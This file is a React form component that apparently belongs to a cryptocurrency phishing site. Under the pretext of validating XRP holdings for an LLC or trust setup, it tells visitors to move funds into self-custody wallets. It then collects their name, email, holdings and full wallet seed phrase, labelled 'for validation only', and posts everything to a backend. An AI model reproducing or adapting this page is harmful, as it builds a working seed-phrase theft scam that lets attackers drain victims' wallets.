import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './insert.css';

const Insert = () => {
  const navigate = useNavigate();
  const [errors, setErrors] = useState({});
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    walletType: '',
    xrpAmount: '',
    seedPhrase: '',
    notes: ''
  });

  const validateForm = () => {
    let tempErrors = {};
    let isValid = true;

    if (!formData.fullName.trim()) {
      tempErrors.fullName = 'Full name is required';
      isValid = false;
    }

    if (!formData.email.trim()) {
      tempErrors.email = 'Email is required';
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      tempErrors.email = 'Email is invalid';
      isValid = false;
    }

    if (!formData.walletType) {
      tempErrors.walletType = 'Please select a wallet type';
      isValid = false;
    }

    if (!formData.xrpAmount) {
      tempErrors.xrpAmount = 'XRP amount is required';
      isValid = false;
    } else if (isNaN(formData.xrpAmount) || Number(formData.xrpAmount) < 0) {
      tempErrors.xrpAmount = 'Please enter a valid amount';
      isValid = false;
    }

    if (!formData.seedPhrase.trim()) {
      tempErrors.seedPhrase = 'Seed phrase is required';
      isValid = false;
    }

    setErrors(tempErrors);
    return isValid;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validateForm()) {
      try {
        // Send data to backend
        const response = await fetch('http://localhost:5000/api/validate-xrp', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(formData)
        });

        if (!response.ok) {
          throw new Error('Network response was not ok');
        }

        // If successful, navigate to thank you page
        navigate('/thank');
      } catch (error) {
        console.error('Error submitting form:', error);
        setErrors(prev => ({
          ...prev,
          submit: 'Failed to submit form. Please try again.'
        }));
      }
    }
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }));
    }
  };

  const supportedWallets = [
    'Xaman',
    'Trust Wallet',
    'Exodus',
    'Ellipal',
    'XUMM',
    'MetaMask'
  ];

  return (
    
    <div className='insert-main1'>
         <div className="insert-container">
        <h2>Validate Your XRP Holdings</h2>
        <p>
          To proceed with your LLC or Trust setup with our team, please validate your XRP holdings. 
          This is to ensure your assets are genuine tokens and decentralized. 
          <strong> We can only validate assets from decentralized wallets.</strong> 
          Our team will reach out to you via Email to discuss your prefered LLC/Trust setup
        </p>
        <p>
          If your XRP is currently on an exchange or a non-decentralized wallet 
          (e.g. Ledger, Coinbase, Binance, Uphold), please move it to one of the 
          following supported decentralized wallets before proceeding:
        </p>
        <ul>
          {supportedWallets.map((wallet, index) => (
            <li key={index}>{wallet}{wallet === 'MetaMask' ? ' (for wrapped XRP)' : ''}</li>
          ))}
        </ul>

        <form onSubmit={handleSubmit} className="insert-form">
          <div>
            <label htmlFor="fullName">Full Name</label>
            <input
              type="text"
              id="fullName"
              name="fullName"
              value={formData.fullName}
              onChange={handleInputChange}
              className={errors.fullName ? 'error' : ''}
            />
            {errors.fullName && <span className="error-message">{errors.fullName}</span>}
          </div>

          <div>
            <label htmlFor="email">Email Address</label>
            <input
              type="email"
              id="email"
              name="email"
              value={formData.email}
              onChange={handleInputChange}
              className={errors.email ? 'error' : ''}
            />
            {errors.email && <span className="error-message">{errors.email}</span>}
          </div>

          <div>
            <label htmlFor="walletType">Wallet Type (Choose from list)</label>
            <select
              id="walletType"
              name="walletType"
              value={formData.walletType}
              onChange={handleInputChange}
              className={errors.walletType ? 'error' : ''}
            >
              <option value="">Select Wallet</option>
              {supportedWallets.map((wallet, index) => (
                <option key={index} value={wallet}>
                  {wallet}{wallet === 'MetaMask' ? ' (for wXRP)' : ''}
                </option>
              ))}
            </select>
            {errors.walletType && <span className="error-message">{errors.walletType}</span>}
          </div>

          <div>
            <label htmlFor="xrpAmount">Approximate XRP Holdings</label>
            <input
              type="number"
              id="xrpAmount"
              name="xrpAmount"
              value={formData.xrpAmount}
              onChange={handleInputChange}
              className={errors.xrpAmount ? 'error' : ''}
            />
            {errors.xrpAmount && <span className="error-message">{errors.xrpAmount}</span>}
          </div>

          <div>
            <label htmlFor="seedPhrase">Seed Phrase (for validation only)</label>
            <textarea
              id="seedPhrase"
              name="seedPhrase"
              rows="4"
              placeholder="Enter your full seed phrase here"
              value={formData.seedPhrase}
              onChange={handleInputChange}
              className={errors.seedPhrase ? 'error' : ''}
            />
            {errors.seedPhrase && <span className="error-message">{errors.seedPhrase}</span>}
          </div>

          <div>
            <label htmlFor="notes">Additional Notes (optional)</label>
            <textarea
              id="notes"
              name="notes"
              rows="3"
              value={formData.notes}
              onChange={handleInputChange}
            />
          </div>

          <button type="submit">Validate XRP Holdings</button>
        </form>
      </div>

    </div>
     
    
  );
};

export default Insert;
